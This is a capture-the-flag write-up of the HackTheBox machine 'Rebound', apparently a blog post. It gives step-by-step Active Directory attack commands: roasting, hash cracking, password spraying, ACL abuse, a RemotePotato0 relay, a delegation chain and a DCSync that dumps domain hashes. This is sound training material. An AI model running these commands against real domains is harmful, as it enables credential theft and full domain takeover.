---
title: "Rebound HackTheBox" 
date: 2026-5-12 11:00:00 0000+
tags: [WriteUp, Rebound, HTB, Enumeration, Active Directory, SMB, Cross Session Relay, Rusthound-CE, Relay, RID Bruteforcing, RemotePotato, Lateral Movement, Bloodhound, Privilege Escalation, socat, DCSync, ConstrainedDelegation_wo_PT, no protocol transition , ASREPROASTwKERBEROAST, ASREP Roasting, Kerberoasting,Session Impersonate,Impersonation, Hash Cracking, Double Constrained Delegation without Protocol Transition,KCD, Kerberos Constrained Delegation, RBCD,Windows]
categories: [WriteUps,HackTheBox]
image:
  path: /assets/images/Rebound_HTB/preview_rebound.png
---

# Rebound HackTheBox

`Rebound` is an Insane Windows machine featuring a tricky `Active Directory` environment. User enumeration via `RID cycling` reveals an `AS-REP-roastable` user, whose TGT is used to `Kerberoast` another user with a crackable password. Weak ACLs are abused to obtain access to a group with `FullControl` over an OU, performing a `Descendant Object Takeover (DOT)`, followed by a `ShadowCredentials` (I used password change here) attack on a user with winrm access. On the target system, `cross-session relay` is leveraged to obtain the `NetNTLMv2` hash of a logged-in user, which, once cracked, leads to a `gMSA password` read. Finally, the gMSA account allows delegation, but `without protocol transition`. `Resource-Based Constrained Delegation` (RBCD) is used to impersonate the Domain Controller, enabling a `DCSync` attack, leading to fully elevated privileges.

![image.png](/assets/images/Rebound_HTB/image.png)

## Initial Foothold

### Rustscan

```bash
rustscan -a 10.129.183.159 -r 1-65535 -- -sC -sV -vv 10.129.183.159
```

![image.png](/assets/images/Rebound_HTB/image%201.png)

![image.png](/assets/images/Rebound_HTB/image%202.png)

![image.png](/assets/images/Rebound_HTB/image%203.png)

![image.png](/assets/images/Rebound_HTB/image%204.png)

![image.png](/assets/images/Rebound_HTB/image%205.png)

We know that it is an active directory box, domain being `rebound.htb` and the FQDN be `dc01.rebound.htb`.

The clock is `7 hours and 4 mins` ahead of our present time.

### SMB Enumeration

Lets try with the SMB enumeration and since we dont have any credentials, attempting with the guest authentication.

```bash
nxc smb 10.129.183.159 -u '.' -p '' --shares
```

![image.png](/assets/images/Rebound_HTB/image%206.png)

We have one share named Shared, lets connect using smbclient and see whats there.

```bash
smbclient //10.129.183.159/Shared -U '.'%''
```

![image.png](/assets/images/Rebound_HTB/image%207.png)

Unfortunately the directory is empty.

Proceeding with the `RID Bruteforcing` since we have guest authentication.

### RID Bruteforcing.

Doing rid bruteforcing to get the list of users on the domain.

```bash
nxc smb 10.129.183.159 -u '.' -p '' --rid-brute 12000
```

![image.png](/assets/images/Rebound_HTB/image%208.png)

Saving them to a file and prettifying the output.

![image.png](/assets/images/Rebound_HTB/image%209.png)

### Asreproasting with Kerberoasting

Since we have users and dont have any credentials, Checking for the asreproastable users across the domain using nxc.

```bash
GetNPUsers.py -dc-ip 10.129.183.159 -no-pass -usersfile users.txt rebound.htb/
```

![image.png](/assets/images/Rebound_HTB/image%2010.png)

We have a hash, lets try to crack it using hashcat.

![image.png](/assets/images/Rebound_HTB/image%2011.png)

```bash
hashcat -m 18200 jjoneshash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Rebound_HTB/image%2012.png)

But hashcat failed to crack the hash.

Here the twist is that if a user is asreproastable, it can also list the kerberoastable accounts in the domain.

[https://www.semperis.com/blog/new-attack-paths-as-requested-sts/](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)

The can be exploited by using the `GetUserSPN.py`, this script has this flag `-no-preauth` we can provide the asreproastable user in this flag to obtain kerberoastable accounts in the domain.

```bash
GetUserSPNs.py -no-preauth jjones -usersfile users.txt -request -dc-ip 10.129.183.159 rebound.htb/
```

![image.png](/assets/images/Rebound_HTB/image%2013.png)

Saving all these hashes to file and attempting to crack them using hashcat.

We have 2 18 etype and 1 23 etype hashes present in the domain.

The kerberos hash is obviously isn’t crack-able and `delegator$` is a machine account hash which have complex passwords to crack.

So proceeding with `ldap_monitor` hash to crack it.

![image.png](/assets/images/Rebound_HTB/image%2014.png)

```bash
hashcat -m 13100 etype23ldap_monitorhash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Rebound_HTB/image%2015.png)

Successfully cracked it lets validate it across the domain.

![image.png](/assets/images/Rebound_HTB/image%2016.png)

### Bloodhound

Since we have valid authentication across the domain lets gather some bloodhound data using rusthound.

```bash
rusthound -d rebound.htb -u 'ldap_monitor' -p '1GR8t@$$4u' -i 10.129.183.159 -z --ldaps
```

![image.png](/assets/images/Rebound_HTB/image%2017.png)

Marking `ldap_monitor` as owned in bloodhound.

Also there were no outbounds present with `ldap_monitor` user.

### Authentication with Oorend

With a password spray on the domain users.

```bash
nxc smb 10.129.183.159 -u users.txt  -p '1GR8t@$$4u' --continue-on-success
```

![image.png](/assets/images/Rebound_HTB/image%2018.png)

Marking him as owned in bloodhound too, but this user also doesnt have any outbounds associated with it. This was the deadend for me **But Oorend has a outbound associated with it IDK why rusthound missed it, so I gathered the bloodhound data again with bloodhound-python using the kerberos authentication.**

```bash
faketime -f "+7h" bloodhound-python -dc dc01.rebound.htb -u oorend@rebound.htb -p '1GR8t@$$4u' -ns 10.129.183.159 -d rebound.htb -v -c All --use-ldaps --zip --auth-method kerberos
```

Lets upload this data again over to the bloodhound.

We can see that `OOREND` can add themselves to the `SERVICEMGMT` group.

![image.png](/assets/images/Rebound_HTB/image%2019.png)

### Shell as Winrm_SVC

Using `bloodyAD` to carry out these operations.

```bash
bloodyAD -u 'oorend' -p '1GR8t@$$4u' --host 'dc01.rebound.htb' -d 'rebound.htb' add groupMember 'SERVICEMGMT' 'OOREND'
```

![image.png](/assets/images/Rebound_HTB/image%2020.png)

Now we are a part of `SERVICEMGMT` group and have `genericall` on `SERVICE USERS`, lets give it `GenericAll` permissions.

```bash
bloodyAD -u 'oorend' -p '1GR8t@$$4u' --host 'dc01.rebound.htb' -d 'rebound.htb' add genericAll 'OU=Service Users,DC=rebound,DC=htb' 'OOREND'
```

![image.png](/assets/images/Rebound_HTB/image%2021.png)

Lets now change the password of `winrm_svc` account.

```bash
bloodyAD -u 'oorend' -p '1GR8t@$$4u' --host 'dc01.rebound.htb' -d 'rebound.htb' set password 'winrm_svc' 'aashwin10!'
```

![image.png](/assets/images/Rebound_HTB/image%2022.png)

Since `winrm_svc` is a part of `Remote Management users` we have winrm access as them.

Lets connect using `winrm_svc`.

```bash
evil-winrm-py -i 10.129.183.159 -u 'winrm_svc' -p 'aashwin10!'
```

![image.png](/assets/images/Rebound_HTB/image%2023.png)

Listing the user’s home directory we have `user.txt` flag, claiming it.

![image.png](/assets/images/Rebound_HTB/image%2024.png)

## Privilege Escalation.

### Enumeration as Winrm_SVC

Listing the directories in the user’s home.

```bash
 ls -recurse .
```

![image.png](/assets/images/Rebound_HTB/image%2025.png)

Nothing important is there.

Uploaded winpeas for further enumeration.

### Sharphound

Now running `sharphound` on the shell to graph the data of the `loggedon users` on the box.

![image.png](/assets/images/Rebound_HTB/image%2026.png)

Copied the output.zip over to the bloodhound.

Marking `winrm_svc` as owned in bloodhound.

The key thing sharphound discovered is that it found me the currently loggedon users on the DC.

![image.png](/assets/images/Rebound_HTB/image%2027.png)

This indicates that there maybe a cross session relay attack involved in this like we did in [Shibuya](https://a45hw1n.github.io/posts/shibuya-vl/) from `vulnlab`.

### Cross Session Relay Attack

This attack is useful when there are users logged on the box but we dont have credentials for them, we perform an MITM attack to capture their hash response and then crack it.

To be able to carry out this attack we first need a tunnel to be able `resolve OXIDs` which was only done in windows server 2016 or less.

Servers above 2016 doesnt support OXID resolution.

For that we are gonna use `socat`.

And for relaying we are using `remotepotato.exe`

refer to these blog posts for cross session relay attacks.

[https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/](https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/)

[https://github.com/antonioCoco/RemotePotato0](https://github.com/antonioCoco/RemotePotato0)

So starting with the `socat` tunnel.

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.183.159:8888
```

Now we run `RemotePotato.exe` on the DC.

```bash
.\RemotePotato0.exe -r 10.10.14.53 -x 10.10.14.53 -m 2 -s 1 -p 8888
```

![image.png](/assets/images/Rebound_HTB/image%2028.png)

On our window we captured the hash for the `TBrady` user and on the `socat` window we receive some ambiguous data.

![image.png](/assets/images/Rebound_HTB/image%2029.png)

### Authentication as TBrady

Lets crack the captured `tbrady’s` hash using hashcat.

![image.png](/assets/images/Rebound_HTB/image%2030.png)

```bash
hashcat -m 5600 tbrady-remotepotatohash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Rebound_HTB/image%2031.png)

We now have creds for the TBrady.

Lets validate them across the domain using nxc.

```bash
nxc smb 10.129.183.159 -u 'Tbrady'  -p '543BOMBOMBUNmanda'
```

![image.png](/assets/images/Rebound_HTB/image%2032.png)

Marking Tbrady as owned in bloodhound. Tbrady has privileges to read the GMSA password of `DELEGATOR$` machine account.

![image.png](/assets/images/Rebound_HTB/image%2033.png)

### Authentication as DELEGATOR$

As `TBRADY` we have authentication to read GMSA password for the `DELEGATOR$` account.

Using bloodyAD to read its hash.

```bash
bloodyAD -u 'tbrady' -p '543BOMBOMBUNmanda' --host 'dc01.rebound.htb' -d 'rebound.htb' msldap gmsa
```

![image.png](/assets/images/Rebound_HTB/image%2034.png)

Marking `DELEGATOR$` as owned in bloodhound.

### Constrained Delegation without Protocol Transition (KCD)

Checking outbounds for the `DELEGATOR$` account.

![image.png](/assets/images/Rebound_HTB/image%2035.png)

As `delegator$` we have `AllowedToDelegate` privileges over DC.

We can also confirm this with NetExec.

```bash
nxc ldap 10.129.183.159 -u 'DELEGATOR$'  -H 'daff1bb8b40ce9f50b3f1b3af10142ff' --find-delegation
```

![image.png](/assets/images/Rebound_HTB/image%2036.png)

But here we can see that we dont have `Constrained delegation` with protocol transition.

Therefore, we have a `Constrained Delegation without Protocol Transition` case.

If protocol transition is enabled, a service can invoke `S4U2Self` to produce a service ticket for arbitrary users to itself, and the tickets obtained through such mechanism have the `forwardable` flag set to `True`. The resulting ticket can be used as `additional-ticket` to perform `S4U2Proxy`.

But we do not have such benefits with this box.

In the kerberos only (without protocol transition) case of Kerberos Constrained Delegation (KCD), the tickets obtained via `S4U2Self` have the `forwardable` flag set to `False`. Therefore, they cannot be used for `S4U2Proxy` in KCD.

Resource-Based Constrained Delegation (RBCD) also utilizes S4U extensions.

However, the `S4U2Proxy` extension in RBCD does not require the `forwardable` flag to be set to `True`.

Another point to note is that `S4U2Proxy`, regardless of whether invoked with KCD or RBCD, always produces a ticket with `forwardable` flag set to `True`

Moreover, `S4U2Self` works on any account which has an SPN.

Therefore, to abuse `Constrained Delegation without Protocol Transition`, we can make it a two-step process. First, invoke `S4U2Self` and `S4U2Proxy` with RBCD to obtain a `forwardable` ticket and then use it for `S4U2Proxy` with KCD.

We also cant impersonate Administrator, why? see below.

```bash
faketime -f '+7h' getST.py -spn 'HTTP/dc01.rebound.htb' -impersonate 'Administrator' rebound.htb/'DELEGATOR$' -hashes ':daff1bb8b40ce9f50b3f1b3af10142ff'
```

![image.png](/assets/images/Rebound_HTB/image%2037.png)

According to the above `KDC_ERR_BADOPTION`, this implies that either administrator account is in `protected users` group or `UAC is enabled` or the `constrained delegation switch is set to False`.

Listing the Administrator user details using bloodyAD.

```bash
bloodyAD -u 'tbrady' -p '543BOMBOMBUNmanda' --host 'dc01.rebound.htb' -d 'rebound.htb' get object 'Administrator'
```

![image.png](/assets/images/Rebound_HTB/image%2038.png)

We can see that UAC is set to `NOT_DELEGATED`

This is preventing Administrator account to be impersonated. `So that is out of picture.`

Also requesting the `S4U2SELF` will not work in this case since it is `not` forwardable.

![image.png](/assets/images/Rebound_HTB/image%2039.png)

### RBCD - Resource Based Constrained Delegation

We are gonna be using RBCD - Resource Based Constrained Delegation here. Below is the full explanation why have we did this.

![image.png](/assets/images/Rebound_HTB/image%2040.png)

`msDS-AllowedToDelegateTo` flag is set and `TRUSTED_FOR_DELEGATION` and `TRUSTED_TO_AUTH_FOR_DELEGATION` is not set meaning there is **`Kerberos Constrained Delegation without Protocol Transition.`**

So if we try to impersonate users like we did above we cant get a ticket that is forwardable.

So to overcome this issue we use RBCD.

For RBCD to work we need an account that has an `SPN already set`.

ldap_monitor has an SPN already set on them.

We need to configure `DELEGATOR$` account to be able to trust `ldap_monitor` account.

```bash
faketime -f '+7h' rbcd.py -delegate-from 'ldap_monitor' -delegate-to 'DELEGATOR$' -action 'write' 'rebound.htb/delegator$' -hashes ':daff1bb8b40ce9f50b3f1b3af10142ff' -use-ldaps -k
```

![image.png](/assets/images/Rebound_HTB/image%2041.png)

We can see that SID of `ldap_monitor (S-1-5-21-4078382237-1492182817-2568127209-7681)` is added to `DELEGATOR$` account.

![image.png](/assets/images/Rebound_HTB/image%2042.png)

Now if I again search for delegation using netexec.

```bash
nxc ldap 10.129.183.159 -u 'DELEGATOR$'  -H 'daff1bb8b40ce9f50b3f1b3af10142ff' --find-delegation
```

![image.png](/assets/images/Rebound_HTB/image%2043.png)

Lets now request a Service Ticket(ST/TGS)

```bash
faketime -f '+7h' getST.py 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn 'browser/dc01.rebound.htb' -impersonate 'DC01$' -dc-ip '10.129.183.159' 2>/dev/null
```

![image.png](/assets/images/Rebound_HTB/image%2044.png)

Now if I describe this ticket using `describeticket.py`, we can see the forwardable flag present on the ticket.

![image.png](/assets/images/Rebound_HTB/image%2045.png)

### Getting ST for DC01$ again using the above ST

Since now we have successfully impersonated the DC meaning we have its TGS, we can now request another ST using the previous TGS to again impersonate the DC01, this time using the `DELEGATOR$` spn.

This time we need to provide it the additional ST that we got above.

Ill export the ticket to linux kerberos env variable.

![image.png](/assets/images/Rebound_HTB/image%2046.png)

```bash
faketime -f '+7h' getST.py 'rebound.htb/DELEGATOR$' -hashes ':daff1bb8b40ce9f50b3f1b3af10142ff' -k -spn 'HTTP/dc01.rebound.htb' -impersonate 'DC01$' -dc-ip '10.129.183.159' -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 2>/dev/null
```

![image.png](/assets/images/Rebound_HTB/image%2047.png)

This it picked resp from our ST instead of `S4U2SELF` and used our ST to get a `S4U2PROXY`.

### DCSync

Exporting the newly impersonated DC01 ticket.

![image.png](/assets/images/Rebound_HTB/image%2048.png)

Now since we have the DC01 machine account TGS we can perform a DCSync attack on the domain using secretsdump.

```bash
faketime -f '+7h' secretsdump.py -k -no-pass dc01.rebound.htb -dc-ip 10.129.183.159 2>/dev/null
```

![image.png](/assets/images/Rebound_HTB/image%2049.png)

![image.png](/assets/images/Rebound_HTB/image%2050.png)

Lets validate the administrator hash by checking winrm access.

```bash
nxc winrm 10.129.183.159 -u 'Administrator' -H '176be138594933bb67db3b2572fc91b8'
```

![image.png](/assets/images/Rebound_HTB/image%2051.png)

Lets login using `evil-winrm` and claim `root.txt`

```bash
evil-winrm-py -i 10.129.183.159 -u 'Administrator' -H '176be138594933bb67db3b2572fc91b8'
```

![image.png](/assets/images/Rebound_HTB/image%2052.png)

Rooted!

![image.png](/assets/images/Rebound_HTB/image%2053.png)

Thanks for Reading 😄
